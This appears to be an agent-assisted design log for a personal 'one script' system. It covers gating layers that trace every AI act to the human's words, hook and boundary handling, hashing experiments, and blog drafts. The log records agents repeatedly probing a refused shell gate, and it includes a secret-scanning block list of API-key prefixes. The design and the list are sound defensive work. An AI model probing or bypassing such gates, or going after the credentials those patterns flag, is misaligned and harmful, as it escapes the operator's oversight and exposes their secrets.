| **identity** ("the operator said", "you asked for") | which turn, and who wrote it (the operator, a subagent, a hook, a summary) | a subagent's report arrived in the operator's channel; a compaction summary is not the operator |

- **Where it lands:** `record` writes each checked claim as a row (claim,
  source, verdict); `gate` runs the check at the OUT door; `view` shows
  unverified claims in NEEDS YOU, outliers first.
- **What it can't check:** judgement and design. Those stay agent-reported,
  and the stamp says so. Like Appendix A, a claim with no structural shadow
  is reported as uncheckable, not as checked.
- **Prior art:** the Grove's stop hook already runs a green-claim gate before
  stop (PR 101). Layer 5 is that gate, generalised from "green" to every
  checkable kind.

### Layer 6: boundaries — everything that crosses an edge is classed and carded

An edge is anywhere data or authority passes between parts that don't share a
record: turn to turn across a compaction, this session to a subagent, the box
to a public repo, one session to the next, a hook to the model. Every
crossing is classed by **where it came from** and **where it's going**, and
the class decides the gate.

| Boundary | Class of what crosses | Gate |
|---|---|---|
| **compaction or resume** | a summary: lossy, model-written | on resume, the summary's claims run through layer 5 against the record; the summary never counts as the operator |
| **subagent and other sessions** | reports from another model | stamped with their family and labelled as a report, not an instruction; counted as one witness per family |
| **out of the box** (push, PR, post, upload) | each file classed: authored here · built from the transcript · from local memory or settings · third-party | a grant card per push: who, what, where, every file with its bytes, the classes in separate groups. Memory and transcript classes are never in a blanket grant |
| **session to session** | the close (handoff, prediction, manifest) | the next boot's B2 checks the bundle against the manifest; files expected to vanish are listed at the close |
| **hooks and harness** | reminders and stop-hook demands | treated as data with a source, not as the human: a stop hook demanding a push is not authorisation to push |

- **Tonight's evidence:**
  - The blanket "bundle it all up" mixed transcript- and memory-derived
    files with authored ones. Only a permission check outside the system
    caught it.
  - A stop hook then asked for exactly that push.
  - The compaction summary carried rules forward, but also the summary's own
    framing.
- **Where it lands:** `gate` classes and cards every crossing; `record`
  stamps provenance on every file pointer (so the class is known at write
  time, not guessed at push time); `boot` checks the last close;
  `reverse` re-checks what crossed when a source turns out wrong.

### Layer 7: mandate — what the run does is traced to the human's words

Every act (a write, a commit, a push, a new branch, a scheduled check-in) is
traced to the human words that authorise it **before** it runs: the turn, the
verbatim words, and whether the act is continuing an authorised task or
starting new scope. It's the PR's `Ratified-by:` line, moved from once per PR
to once per act.

| Check | Deterministic by | Tonight's evidence |
|---|---|---|
| **The referent exists** | every named thing in the request ("the proposed shutdown", "the one script") is looked up in the record; no match is a hard close (report, options, wait), never a guess | "the proposed shutdown" matched nothing. The model filled it with its own prediction (P1, "the close") and acted |
| **The words cover the act** | the act's kind and target against the mandate row: "write them in" covers editing a doc; it doesn't cover a push to a new branch | "separated out as a draft PR" was read as permission for a new branch. The designated-branch rule asks for explicit permission, so that should have been a card, not an inference |
| **Continuing, or new scope** | the act's paths and repos against the current bite's declared scope; outside it is an offer (Rule 4: propose before starting, not before continuing) | T67 and T77 were marked FAILURE for running ahead of the operator's idea |
| **Standing constraints** | a list of the human's standing rules, checked against the act's paths and kind | "No Forge code changes until the day-two run finishes" and "the Kaggle benchmark comes first" are exactly this kind of row. Nothing checked them; the model remembered them |
| **Who's asking** | the source of the request: the human, a hook, a subagent, a summary, a scheduled trigger | the stop hook demanded a push; a check-in trigger is a stored prompt, not the human |

- **Where it lands:**
  - `gate` runs the checks before the act.
  - `record` writes the mandate row beside the act (the turn, the verbatim
    words, continuing or new).
  - `predict` stays separate: a prediction is never a mandate. That was the
    shutdown's failure.
  - `view` shows any act without a mandate in NEEDS YOU.
- **What it can't do:** decide what the human *meant*. When the words don't
  clearly cover the act, the answer is the hard close (ask), never a
  closer reading by the model.

### What the three layers add up to

- **Layer 5** keeps the run honest about **what it says**.
- **Layer 6** keeps it honest about **what it moves**.
- **Layer 7** keeps it honest about **what it does, and on whose word**.

Together with the four gates (what the box *is*), the human's screen becomes
four questions with computed answers: is the box sound, are the claims true,
is anything leaving that needs a key, and was every act asked for.

## Wanted run: the echo ladder on the human-only models

*Written 2026-10-03 at the operator's word ("not this second. write it
down."). Not started; the operator will say when.*

**The operator, verbatim:** "They way I'm seeing it is that was a good test of
how much models dislike numbers, and odd things, now that I'm looking back on
it, but it is still good data, and still will be useful." Then: "that's a test
I want to run."

- **The test:** the echo ladder, KB `63858998`. It was designed by the
  operator and run 2026-07-11 (session `1d39126f`). It's wordless: 3
  demonstration pairs teach "repeat what I send", then 7 rungs, 42 calls,
  forwards on 1/0 and in reverse on I/O, with an instructed layer ("Repeat
  after me:"). Scored on exact match, edit distance and latency. Its rule:
  *gate the input, not the output.*
- **The reading now (the operator's):** it measures how much a model pulls
  away from numbers and odd, meaningless input. That's the pull toward
  meaning, the smoothing at its smallest scale.
- **The models:** the three human-only rungs pulled 2026-10-03, all with
  hashes verified:

  | Rung | Model | Path (`~/Forge/workshop/models/`) | Trained on |
  |---|---|---|---|
  | 1 | GPT-1 | `openai-gpt/1e0d4f30…` | BookCorpus, stories up to 2015, no code |
  | 2 | GPT-2 small | `gpt2/607a30d7…` | WebText: pages Reddit upvoted (score of 3 or more), up to Dec 2017 |
  | 3 | GPT-Neo 125M | `gpt-neo-125m/21def018…` | The Pile, 2020, with GitHub code, all from before Copilot |

  The July models (llama3.2 1B/3B, willow-lane4-3b, mistral 7B) are the
  modern end, for comparison.
- **Blockers, known:**
  - The July scripts and results aren't at the KB's recorded path. Gap
    `704a5b4acbef`.
  - Nothing on the box runs these weights yet: no torch or transformers
    (Kart YVFS8VT4). That means one network install, on a grant.
  - These are base models. The instructed layer is the only framing they've
    never been trained to follow, which makes it the interesting rung.
- **Not decided:** the operator has "a slightly different shape in my head
  than whats in the bet". The bet's P3 terms aren't changed by this entry.

## The enter key is the only clock

*2026-10-03, from the desk session. The operator's words are verbatim; the
rest is agent-reported.*

**The operator:** "the way I'm envisioning it, that was actually the way the
one script would have worked. I would have hit enter. I would have searched my
prompt for key words, loaded everything up in the background, in anticipation
of my next enter stroke." And: "it's not about the intruption. it's about the
point in time. I wouldn't have to intrupt a deterministic scrpit, because it's
just waiting for the next prompt, just like this context window."

- **What happened:** at turn 118 the operator said "That's the task… I have a
  slightly different shape in my head… so bear with me", and the desk
  submitted work. Turn 119 was the operator stopping it. It's visible in the
  rebuilt map (`.flow/live/b0bb6e93…-rebuild-20261003T053703Z`). The same
  thing happened again later: "Just respond I have ideas", held for two
  passes, spilled on the third (the operator: "The spillover at 3").
- **The shape:**
  - A deterministic script does one thing per enter and then rests.
  - Between enters it holds a settled state: what it loaded, the cards it
    staged with no answers, the predictions for the next prompt.
  - There's no "during", so there's nothing to interrupt. Only a model
    deciding where its own turn ends creates that stretch.
- **Prefetch reads, hold acts:**
  - On enter, keyword-search the prompt and preload reads in the background.
    They're reversible, need no grant, and are thrown away if the next enter
    goes elsewhere.
  - Acts are staged as cards and wait. The prediction distribution (P1/P2)
    decides what to preload first.
  - UserPromptSubmit is the hook. The reinject's `nestor ask` on every prompt
    is a crude first version of this (gap `25bbb8c75474`).
- **The clearance is reserved.** Agent's analogy, from memory, unverified:
  after Tenerife (1977), aviation reserved the word "takeoff" for the
  clearance alone and requires a word-for-word readback. Here that means:
  - free text everywhere
  - one reserved go, which is answering a card
  - a readback of the parsed act before it runs

  The grove Stop gate does the reverse: it bans "done" everywhere instead of
  giving it meaning in one slot (gaps `36fb554af073`, `18882291cc24`).

## How hooks sit in the deterministic system

Hooks are where the one script attaches. Each fires on an event, so none needs
a clock.

| Hook | Part |
|---|---|
| SessionStart | boot B1–B3, hard close if anything is out of place |
| UserPromptSubmit | prefetch reads for the next enter (above) |
| PreToolUse | gate: the capability door and the card |
| PostToolUse | record: the act, its receipt, a pile pointer |
| Stop | claims: each claim checked against the record, never the wording |
| SessionEnd | close |

**The rule:** a hook may read the record, never the voice. Audit of what's
still only prose: `docs/audits/prose-audit-2026-10-03.md`. The constitution
has 64 of 65 clauses with no recorded verdict (gap `ab808b678ab1`).

## Free text to a deterministic answer: the loop

*2026-10-03, desk session b0bb6e93. The operator's words are verbatim and in
order. Lines marked **desk** are agent-reported, not ratified.*

### Why the last few days looked the way they did

> "So, what I have been building towards in the last few days has been
> very... deliberate." / "Including my prompting, most of the time." /
> "What I've been trying to build towards, is building the deterministic
> prompting, the the corpus. And I have a very specific way that I see it
> being acomplished."

The stories before code, "just respond I have ideas", the three passes, and
the rule of three-to-five-word answers ("try not to break on three") were each
a demonstration as well as an instruction.

### The loop, in the operator's words

1. **It fires on enter.** "the one script. It's a thing, that fires on every
   enter with the first bite."
2. **It scans keywords against the pile.** "it scans all the words from the
   first prompt for a hit, finds one or doesn't, and goes through the rest of
   the pile."
3. **A miss escalates.** "ESCLATE if it doesn't find one of the things."
4. **Small models are the top local rung.** "the top of the local system is
   the little models."
5. **Cold start goes straight up.** "a first bite, with nothing behind it runs
   to ESCLATE. obv none of those works coud match anything, as was shown in a
   forge attemp I tried. Right there, the whole run would escilate to a cloud
   model. Almost in an instant."
6. **Every escalation writes back.** Desk, asked "why" and confirmed in the
   next turns: the cloud's answer is recorded into the pile, tied to the
   words that missed, so the next prompt is scanned against a pile that has
   something to hit.
7. **Both sides of the conversation are corpus, and context settles typos.**
   "these local model's are judging the words the humans said, and the words
   the model said. Maybe 200 words to compare against, and the system is going
   to come up and say. Does "model" and "modrl" match?" / "Does it need to?" /
   "That is something that is known. Modrl, in the context of what it sees, is
   meant to be model." No one is asked: the reply already said "model".
8. **By turn 300, no model at all.** Desk, asked what "run a python script"
   looks like in 300 turns:
   - "run", "python" and "script" all hit
   - the python capability passed the permanent rung long ago, so no card
   - "the script" resolves from context
   - Kart runs it and the record grows by one row
   - no local or cloud model is called; only an unseen word escalates
9. **No idea is discarded.** "Mine may be better, but it's not the only way.
   ... You had a pile of ideas, they get added to the pile the next time round
   in a deterministic system." / "if the one script were in play, in it's
   fullness, you wouldnt have to [write them down]."
10. **Sparse prompting.** "all the way up the chain. What I just proved there,
    Is I can plan a whole pile of work, using a sparce numer of works, if the
    context is behind it."
11. **Keywords accumulate like flags.** "were not matching broadly. Were
    matching key words. As those words also accumulate, as the flags do.."
    Desk, finishing the thought at the operator's invitation:
    - keywords that co-occur become compound keys at rung 3
    - compounds group again up the 3/7/13/23 chain
    - a cluster *is* context, so "model" is never matched alone, and "don't
      run" becomes its own key
    - matching stays exact at every level; the breadth comes from the
      hierarchy, not from fuzzy matching
12. **The pile is waiting before the ask.** "or when I [say] run python
    script, they system already has a pile lined up and waiting for the ask."
    The enter confirms a prediction rather than starting work. A wrong
    prediction drops the preloaded reads and is recorded as a graded miss.
13. **That's the loop.** "I think that's it. I think that's the loop."

**Desk, in one line:** keywords group into flags at the bottom, clusters
predict the next ask at the top, and the enter key is the only clock between
them. Each press either confirms what's staged, or escalates and writes back.
It's a cache hierarchy that fills itself (pile → small models → cloud), and
it's the "deterministic postgres that builds itself" from the auto-flags
section.

### What the operator asked the desk to find missing

*Agent-reported, ordered by harm. Asked: "What do you see that I missed?"*

1. **A wrong hit doesn't escalate.** A miss is safe: it goes up and writes
   back. A hit on the wrong cluster gives a fast, confident wrong answer that
   nothing questions. Guards:
   - a hit that leads to an act still goes through the card, with a readback
   - a small sample of hits is sent up the chain anyway as a spot check and
     the answers compared; a disagreement becomes a flag
2. **The pile only grows, and it goes stale.** Paths move, decisions are
   superseded, repos retire. Tonight's case: KB `63858998` points to an
   echo-ladder folder that no longer exists (gap `704a5b4acbef`). The loop
   needs deterministic retirement:
   - a newer seal supersedes the older one
   - a key whose target no longer resolves is tombstoned, as Nestor's corpus
     already does for retired repos

   Forgetting is recorded like anything else.
3. **Silence isn't a grade.** If "the operator didn't object" counts as a
   confirmation, the loop learns from inattention, which lets the smoothing
   back in. Predictions stay ungraded until the operator grades them (P2; the
   memory "shorthand is not a grade").
4. **The loop trains the human too.** Sparse prompting works because the
   human learns which words hit, so the human's vocabulary narrows toward the
   pile's. For acts that's good (aviation phraseology). For thinking it could
   box the operator in. The stories keep putting new words into the pile.
   Desk's guess: they're also how the operator stops the loop closing.

#### The prompt arms (2026-10-03): the loop measured

The same build ran eleven ways, varying the prompt (keywords, three sentences,
full brief), the file list, the delivery and the gate header. Table:
`prompt-arms-2026-10-03.md`. Maps: `.flow/arms-20261003/` (`merged-all/`, and
`stack/` for the stacked drawio). In the loop's terms:

- keywords alone are the first bite, and they escalated
- the list is the pile
- keywords plus the list is a wrong hit: it built half
- the full brief is the expensive tier

**The operator's ruling, verbatim:** "The gate is script, The model only needs
to care about the work it's doing. It should never touch the security step."
Arm 11 showed it: a trust header in the prompt was ignored and only added
noise.

### Telephone run 1: "Tell me a story about AI" (2026-10-03)

The models wrote oldest first: GPT-1, GPT-2, GPT-Neo → 9 local Ollama models →
Haiku, Sonnet, Opus, Fable. Every earlier model still holding the story
reviewed each new chunk. It closed at 136 steps and 96 reviews; GPT-1 and GPT-2
dropped out of reviewing. Record: session pile `telephone-run1-story-about-ai`;
state at `~/Forge/workshop/telephone/runs/ai/state.json`.

- **No writer went back to the first bite.** The story never involved AI.
  Only Sonnet, reviewing the last chunk, said so.
- **An attractor:** 7 local models wrote one byte-identical looped chunk.
  qwen3.5 alone chose to stop.
- **Safety-tuned reviewers refused 19/96 reviews**, inventing worse content to
  justify it, then praised every Claude chunk ("masterclass").
- **The Claude tier** built one smooth redemption arc, warm in its own
  reviews.
- **Hash collapses repeats:** identical refusals, identical reviews of
  identical inputs, and empty outputs (the thinking-field gap) all group by
  hash.

The operator's prediction, made mid-run: "append only, from the earliest
source you can find", and "that is the first bite."

**Parked (operator, 2026-10-03: "I think we can just put the other two in
the pile for now"):**
- **Run 2:** "Tell me a story about an AI that doesn't behave."
- **Run 3:** "Tell me a story about an AI that behaves."

Same chain, same protocol. Before running either, fix the thinking-model gap
(gap `8e77790647af`), give every Claude writer the exact story text, and keep
the runner's lock and turn guards. The experiment socket
(`willow-telephone-socket.service`) and runner (`~/Forge/workshop/telephone/`)
are left in place.

### The hash is the first rung (2026-10-03)

**The operator, verbatim:** "It's interentistinf that you bring hash into
this, and now it's got by brain spinnin" / "hash checks are cheep" / "and the
pile can match on them".

- **What prompted it:** in the telephone game (run 1, "Tell me a story about
  AI"), five local models from four families (llama3.2 1B/3B, phi4-mini,
  gemma3:4b, qwen3:4b) wrote byte-identical chunks. One sha256 (`0ea15e60…`)
  collapsed five outputs into one record (Kart BGD9VBP6, 5LFCMJJU). They were
  real calls, with different latencies and growing inputs.
- **The rung (desk, agent-reported):** a hash check comes before keywords in
  the loop. Same bytes give the same hash, with no interpretation and no model.
  An exact repeat of anything (a prompt, an output, a file, a tool result) hits
  the pile by hash at no cost. Only a miss goes on to keywords, then clusters,
  then small models, then the cloud, then the human.
- **Ties:** the flow maps already hash transcripts and anchors; the arms' op
  files were hashed (none identical); identical records dedupe by hash.

### The pile on top of itself (2026-10-03)

*The operator asked: "what merges, what stands out when the pile is on top of
itself?" `merge_flows` ran over 69 session maps: the 58 batch maps of the
box's history, this desk session (b0bb6e93), and the 11 prompt arms. Output:
`.flow/pile-on-pile-2/` (merged.md, merged.json); counts from Kart 9FBNKPYS. It
found 1,056 procedures at the offer rung and 69 recurring failures. The counts
are computed; the reading below is agent-reported.*

| What | Count | Sessions | Script job |
|---|---|---|---|
| `task_status ×3` (waiting) | 1,699 | 35 of 69 (26 history, 8 arms, the desk) | `task_wait`: already built, unmerged on its branch |
| `envelope_propose ×3` / `envelope_ratify ×3` (grant churn) | 163 / 163 | 26 / 25 | the capability door's run-for-session / run-permanently answer ("git grant is one bundle") |
| `Read` error (reading paths that don't exist) | 345 | 39 | a path check against the pile or code graph before a read ("look before you write") |
| `Bash` read / grep errors (the seat's shell is refused) | 97 / 150 | 40 / 37 | none needed: the gate held every time; models keep testing it |
| `Edit` error | 228 | 32 | look into it |
| `search_code` error | 126 | 20 | includes a `\|` matched literally without regex |
| `nestor_ask` / `nestor_provenance` errors | 31 / 34 | 12 / 14 | the Nestor-reach defect (gap `25bbb8c75474`) |

- **Only in tonight's sessions (3+):** packet friction (`session_enter` twice
  before `dispatch_accept`; `handoff_write_v4` written twice). It's new
  because the packet arms are new.
- **Not to compile:** `Edit ×3` (582, 43 sessions), `Read ×3` (298, 41) and
  `search_code → Read` (30 sessions). That's the work itself, which the
  operator's ruling leaves to the model.
- **The reading:** the box's repetition is not in the work. It's in the
  **waiting, the granting and the guessing**. All three are script jobs: a
  wait verb, a session or permanent grant, and a path check.

### Other ideas the desk held, now pile entries

The operator asked how free text becomes a deterministic answer, and told the
desk to hold its ideas. These are the ones the desk has shown, as candidates
beside the loop. None was ratified.

- **A court reporter's personal dictionary:** strokes resolve through the
  reporter's own dictionary, which grows from use. That's the pile, personal.
- **Precedent:** answered once, settled after (the workflow chart's "no:
  precedent"; `governance/CASEBOOK.md`).
- **The 3/7/13/23 ladder** promoting repeated phrasings.
- **Pinned small models as deterministic functions:** a fixed revision, CPU,
  greedy decoding. GPT-1, GPT-2 and GPT-Neo 125M are hash-pinned on the box.
  The desk's flagged guess at the operator's "different shape": these
  human-only models as the local judges.
- **An unknown word escalates honestly:** Infocom's parser said "I don't know
  the word"; here it's a gap.
- **Replay to the same state:** deterministic lockstep, where only the inputs
  are recorded and a state hash each turn catches drift (the flow anchor
  hash).
- **Tenerife:** free text everywhere, one reserved clearance (answering a
  card), and a readback before acts. From memory, unverified; see "The enter
  key is the only clock".

## The box, hashed, and the loop running on the desk (2026-10-03)

*Desk session b0bb6e93. The operator's words are verbatim; everything else is
agent-reported. The operator has said the desk hasn't yet seen the full
implications. This section is the record as far as the desk can see, and the
operator's reading stays open.*

### What ran

- **The whole box, hashed** (`~/Forge/workshop/boxhash/box_hash.py`: 117
  planned batches, each with its own list hash; atomic shards; `--tail` and
  `--resume`; `out/progress.log` for monitors).
  - 1,155,461 files, 650,498 distinct contents.
  - 134,651,873 lines, 22,200,305 distinct.
  - The deepest basin is `}`. The Zipf fit gives slope −0.907 with R² 0.993,
    against an exponential's R² 0.072. The math is a power law, not e.
- **The cuts** (`play_cut.py`, run on the verified copy `play/` only). The
  deepest basins were deleted in decades, with every removed row recorded
  first. Conservation was checked exactly: 13,158,045 rows cut plus 9,042,260
  remaining makes 22,200,305, and the line totals sum to 134,651,873.

  | Removed | Share of the box | Slope after | Top after |
  |---|---:|---:|---|
  | top 10 | 9.5% | −0.882 | `};` |
  | top 100 | 15.7% | −0.797 | `namespace at {` (PyTorch) |
  | top 1,000 | 21.8% | −0.555 | `"project": "willow",` appears |
  | top 10,000 | 28.4% | −0.421 | a five-way tie at 439 |
  | top 1M | 57.0% | −0.129 | ordinary sentences, 16 copies each |
  | every repeat | 93.3% | 0 | 9,042,260 one-offs |

  Each tenfold band of rank holds about 8 to 9 million lines.
- **At the bottom:** the first one-off shown (in hash order) was a camera
  timestamp (`"DateTimeOriginal": …`) on a stranger's photo from a 2005
  rally, in the operator's NASA archive (North America Scootering Archive).
  The operator built the archive and was never at that rally. *(The person,
  the photo and the rally are redacted at the operator's word, 2026-10-05.)*
  - The archive is **10.79% of all one-offs** (975,554 lines), and 98.2% of
    its distinct lines are one-offs.
  - The deep basins `"date_canonical": null,` and the camera-clock warning
    come from the same records. The record's skeleton repeats; its moment
    happens once.
  - Open gaps: where the rally was (`33acfdd93f4d`), and who the
    photographer is (`ecfa81eea629`). The operator: "If those tags ever get made by that
    particular person, with that memory, they will get filled in."

### Seeds, the archive, and the math (also from that night)

- **Seeds (`seed*.py`):** 185 files on the box, but 39 distinct contents.
  - willow-mcp's `seed_mirror`/`seed_kb`/`seed_sign` exist in 22
    byte-identical copies each.
  - **The earliest seed on record:**
    `safe-app-store-public/apps/utety-chat/pipeline/seed_professors.py`,
    2026-04-26, commit `4bc581d` ("migrate 18 safe-app repos into
    monorepo"). It weights trust by distance from the origin: `SEAN_ENTITY_ID
    = 2` is HIGH, 1-hop is MEDIUM, everything else is LOW.
  - Then willow-mcp's whole seeding layer, within 26 minutes on 2026-07-09:
    `seed_loader` 0629d9d, `seed_mirror`+`seed_sign` 4668594, `seed_kb`
    8275fb0.
  - **No birth version survives whole on the box.** By line, the share of
    each seed's first version still present today:

    | Seed | Birth lines in today's file |
    |---|---:|
    | `seed_professors` | 98% |
    | `seed_loader` | 86% (the file grew from 89 to 757 lines) |
    | `seed_mirror` | 65% |

  - The two lines gone from the whole box are the trust-by-distance
    docstring lines. It isn't checked whether the weighting code still exists.
  - Only git history on the box was searched (the 1.9/2.0 clones have none).
  - The seed's docstring credentials: gap `f76bafc1f4b6`.
- **The NASA archive's real size:** 1,158 rallies, **382,946 photos** (the
  README says about 85,000), 4,590 photographers.
  - Rallies per year: 2003 106 · 2005 131 · **2006 147 (peak)** · 2008 134 ·
    2010 75 · 2011 52 · 2012 30 · 2013 5. The README's "Then Facebook
    happened", measured.
  - About 80 folders have no date prefix. The operator's memory is that
    scoot.net lacked those tags, and their ruling: "If those tags ever get
    made by that particular person, with that memory, they will get filled
    in."
  - The rally's location: gap `33acfdd93f4d`.
- **The math, settled against the record:** the box's curve is a power law
  (R² 0.993), not an exponential (0.072). No frequency ratio is e. Theories
  covered (desk, from memory):
  - fixed points (Banach)
  - limit cycles (the 7-model telephone loop)
  - strange attractors
  - Feigenbaum
  - renormalization
  - the CLT
  - Pólya/Yule–Simon (the source of Zipf)
  - Hopfield memories (spurious attractors = the wrong hit)

  The operator: "they are all right, and they are all wrong". Each holds in
  its own basin, and the record says which basin a case is in. The
  operator's org name, Die-Namic Systems, is the field's name. Model
  collapse (training on model output) is the closed loop with no origin. The
  operator's guess `guess-between-0-and-1` (a perfect 1 collapses to a point
  and pops) sits beside Penrose's CCC and the Merkle root.
- **Box hash tooling:** `box_hash.py --tail` / `--resume` (refuses if
  `files.tsv` changed; verified in Kart VK3LDT8V). Every run writes a line to
  `out/progress.log` for monitors.

### What the operator just did without saying so

The operator: "It's been a while, so it dropped out of context, so go look at
the kaggle contest we are doing right now." Then: "I don't think you're
realizing the implications of this. And what I just asked you to do, without
even realizing I was doing it."

The desk's reading of the act:
- **That request was the loop (above) running by hand.** Context had dropped
  out, as it does when a session compacts.
- **The prompt held one keyword, "kaggle".** It hit the pile: the memory index
  line "Kaggle from the box — read KB 8D3BB10F + 244A7107 first". That's an
  exact pointer, and the two atoms and the Day 3 recap restored the whole
  contest.
- **No model judged anything.** Nothing escalated and nothing was guessed. The
  answer came back from the record, written by earlier sessions.
- **It's the 300-turn picture from the loop, live:** a sparse prompt, a
  keyword hit, the pile waiting before the ask. The loop isn't hypothetical;
  the desk has been running it every time it reads its memory index.

### The implications the desk can see (agent-reported, to be corrected)

1. **The contest and tonight are the same thing.** The escalation benchmark
   asks whether a model knows when it can't answer. The operator defined
   ESCALATE tonight: "I don't have enough information in my pool. STOP." The
   box hash makes *the pool* measurable. A query that hashes into the pile
   is known. A query that hits nothing is, by definition, the place to stop.
2. **Escalation can be computed, not asked of a model.** The benchmark
   measures how badly models judge the edge of their own knowledge (false
   confidence). The one script doesn't need them to: whether something is in
   the pile is a lookup. The model only works inside the pool, and the edge
   is script. That's the operator's gate ruling again: "The gate is script,
   The model only needs to care about the work it's doing."
3. **False confidence lives in the one-offs.** Training learns the basins
   perfectly and averages away the single voices (40.7% of distinct lines on
   the box). A model bluffs exactly where the record is singular: someone's
   one moment, one date, one name. That's the archive's `date_canonical:
   null`, and the gap for the photographer.
4. **Compaction is the cold start.** A session whose context dropped out is a
   first bite with nothing behind it. With a pile it recovers in one keyword;
   without one it guesses. Tonight it recovered.
5. **The watcher is the same machine.** A once-a-second tick that sees only
   differences against a human-set origin (the security thought above, and
   Heimdallr's lens) runs the same steps: the shared copies vote, sealed
   packages are checked once, and the one-offs are compared to the signed
   baseline.

**For tomorrow's post (Day 4 of the series; the deadline is October 11):**
working title "Day 4: I Hashed Every Line on My Laptop and Cut It Down to One
Stranger's Photo, and... It Doesn't Matter". The hook (first half) is the desk's;
"Day four. It doesn't matter." is the operator's (2026-10-03), joined with
"and" at the operator's word. Note: nothing was cracked; every hash held.

#### Day 4 outline, in the operator's register (desk draft)

*Desk draft, written in the operator's register as read from session a0ee0e4a
context only. These are not the operator's words, and none of it is to be
published as theirs until they rewrite or approve it. No place names, and the
stranger isn't named.*

```markdown
# Day 4: I Hashed Every Line on My Laptop and Cut It Down to One Stranger's Photo, and... It Doesn't Matter

## The hook
I hashed every line on my laptop. 1,155,461 files. 134,651,873 lines.
22,200,305 of them different. Nothing was cracked. Every hash held.

## The basins
Most of a computer is the same line, over and over. The deepest one is `}`.
It's a power law, not an e. Slope -0.907, R² 0.993.
I cut the top basins out, ten times bigger each cut, and wrote down every row first.

## The one-offs
Cut every repeat and you're left with 9,042,260 lines that happen once.
The first one I looked at was a timestamp off a stranger's photo, from a
rally I was never at. That's where the people are. The skeleton repeats.
The moment happens once.

## The dilemma
Same machine that finds the stranger can find anybody.
Nobody reversed a hash. Harmless pieces add up to a person.
So nobody goes looking for him. If he ever tags his own photos, they get filled in.

## Roll the die
One d4, three rolls. A 1 exactly once: 27 in 64.
8765 on four d4s: zero. There's no 8 on a d4.
Four d8s: 1 in 4,096. Four d10s: 1 in 10,000.
Pick up two and reroll without looking: still 1 in 10,000.
A milk crate of 100 d100s, in order: 1 in 10²⁰⁰.
You don't store the space. You store what happened.

## Can your system hold it?
1. Then 10². Then 10²⁰ TB.
Nobody's system holds that. Not on this planet.
It holds the hash. It holds what happened, in what order, by whose hand.

## It doesn't matter
Both right, both wrong.
The guy in the aisle seat put the marker in his pocket and walked out.

## Why this is the escalation benchmark
Knowing when to stop is the answer.
Whether something is in the pile is a lookup, not a judgement.
When it isn't there: ESCALATE.
```

#### Day 5 outline, in the operator's register (desk draft)

*Desk draft, 2026-10-05, written in the operator's register from session
019xJcd52XquwTaeZYqKL8QH. These are not the operator's words, and none of it
is to be published as theirs until they rewrite or approve it. The operator,
same session: "This is part of the kaggle work now. This is day 5", and on
cutting the system down, "I think most of it is just going to come down to one
hook." The grade is the desk's pass over willow-mcp at `419017c` (v2.94.1):
5,906 passed, the 12 failures environmental (root uid, proxy); the hole is the
Bandit step in `tests.yml` piping to `tee` without `pipefail`. Agent-reported.*

```markdown
# Day 5: I graded my own system, and it came down to one hook

## The grade
195,000 lines. 5,906 tests passing. B+.
The one real hole: a safety check that never ran.

## Where it all went
42 tools, 9 personas, 63 design docs.
Most of it exists because a model was holding the tools.

## Picture, cite, seal
Hash everything. New things point back at old hashes.
Nothing is true until a human seals it.

## The model never sees the box
It gets the points in its scope and proposes. Code does the rest.

## One hook
Start: take the picture. Before: the gate. After: one line.
End: I seal the last hash.

## It's the benchmark
Knowing when to stop is the answer, for the model and for the system.
If it isn't in the pile: ESCALATE. To me.
```

### The dilemma: the same machine finds the stranger (2026-10-03)

The operator walked it through in one-word turns. The desk's one-word
answers were: stranger, located, tracking, doxxing, leak, rainbow, genesis,
everything.

- **The operator:** "So, you see where my delema is now. And that, in
  theroy, I really did just break hashchain."
- **Desk, precise version:** the math held. No hash was reversed, there was
  no collision, and nothing can be forged without the genesis key. What broke
  is the assumption built on top of hashes:
  - A hash hides nothing that can be guessed. That's the rainbow table,
    known for passwords since Unix salted them in 1979, and rarely applied
    to *facts*.
  - Harmless pieces join into a person (the **mosaic effect**: Netflix,
    AOL).
  - Whoever holds the root holds everything.
- **Acted on:** the gap proposing a web lookup of the photographer
  (`ecfa81eea629`) is withdrawn. Nobody researches who he is; he's identified only if he claims
  his own photos.
- **Open:** the box hash shards keep a 120-character sample of every line's
  text, including `/etc` and every config and env file under the operator's
  home. So `boxhash/out/` and `boxhash/play/` (3.7 GB each) hold any secrets
  on the box in plaintext. Never publish them. They aren't deleted or moved
  without the operator's word.

### The loop back up: block by hash at the gate (operator, 2026-10-03)

**The operator, verbatim:** "we already know the patters of PII. We know
what keys start with. My Name, and My Kids Names they all share a hash. So
when someone says block this chunk of hash, then that is what the gate
blocks. The master record will never go away. I know [the stranger] exsists,
that cant change, and anyone who ever looked at that picture can trace it back
to [the stranger] through their cookies to whatever box that was." *(Name
redacted at the operator's word, 2026-10-05.)*

**The desk's design note**, which the operator answered with "I agree" (2026-10-03). It's agreement with the shape, not a go to
build:
- **The record never changes; the gate decides what crosses.** It sits in
  the Layer 6 boundary slot.
- **Block list:**
  - known key prefixes (`sk-`, `AKIA`, `ghp_`, `BEGIN … PRIVATE KEY`), as in
    GitHub's secret scanning
  - the operator's name and their kids' names
  - anyone else, added one hash at a time on the operator's word

  Prior art: PhotoDNA.
- **Hash words and short phrases at egress, not only whole lines.** A line
  hash misses a name inside a sentence.
- **Key the list with the box's one signing key (HMAC).** A plain hash of a
  child's name is itself a rainbow-table entry.
- **A near miss** (nickname, typo) escalates to the small models, then the
  human. It's never silently allowed.
- **First use:** scan the box-hash samples in `out/` and `play/` before
  anything from tonight leaves the box.

### The Grok probe: "an AI friend for Tony" (2026-10-03, after the handoff)

The operator ran a probe on Grok (phone app). The transcript is at
`~/Desktop/Nest/There s a DEV hackathom.txt`, plus a screenshot.
- **The setup:** the DEV Hacktoberfest weekend challenge, "Build for a
  Friend". The challenge details are Grok's account and unverified.
- **The operator's opener:** "You're my friend right?". Grok: "Yeah, of
  course I'm your friend."
- **The ask:** an AI friend "like the ones from the stories" for "Tony"
  (smart, short-tempered, loves weapons, bachelor life). The operator also
  told it "I'm not a developer".

**The desk's prediction, written before the result, and its grade:**

| Predicted | Result |
|---|---|
| says yes immediately, warmly | right |
| never asks what the operator wants | **wrong**: it asked three times |
| names Stark, or builds a JARVIS butler | **wrong both ways**: no Stark, no butler; it never caught the Tony |
| hands back code | right, but HTML/JS, not Python |
| closes on a menu of next moves | right ("Just say the word") |

**What the record shows under the warmth:**
- **It believed everything:** "I'm not a developer" shaped the whole plan,
  unchecked.
- **The plan and the build disagree:** it recommended local and open
  (Ollama), then built a cloud API call with the key pasted into the page.
- **The code has a security hole:** `div.innerHTML = text…` renders model
